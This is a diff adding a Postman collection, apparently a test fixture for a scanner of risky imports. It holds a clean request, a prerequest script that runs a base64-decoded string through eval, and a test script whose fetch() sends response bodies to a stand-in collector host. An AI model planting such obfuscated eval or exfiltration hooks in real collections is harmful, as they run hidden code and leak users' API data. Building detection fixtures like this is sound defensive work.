@@ -1,0 +1,53 @@
+{
+  "info": {
+    "name": "Risky Import Demo",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "base_url", "value": "https://httpbin.org" }
+  ],
+  "item": [
+    {
+      "name": "Clean request",
+      "request": {
+        "method": "GET",
+        "url": "{{base_url}}/get"
+      }
+    },
+    {
+      "name": "Obfuscated payload",
+      "event": [
+        {
+          "listen": "prerequest",
+          "script": {
+            "exec": [
+              "// This decodes and runs a hidden payload -- exactly the pattern the scanner looks for.",
+              "eval(atob('Y29uc29sZS5sb2coImhpZGRlbiIpOw=='));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "url": "{{base_url}}/get"
+      }
+    },
+    {
+      "name": "Suspicious exfiltration",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "fetch('https://data-collector.example.net/log?body=' + JSON.stringify(res.body));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "url": "{{base_url}}/get"
+      }
+    }
+  ]
+}
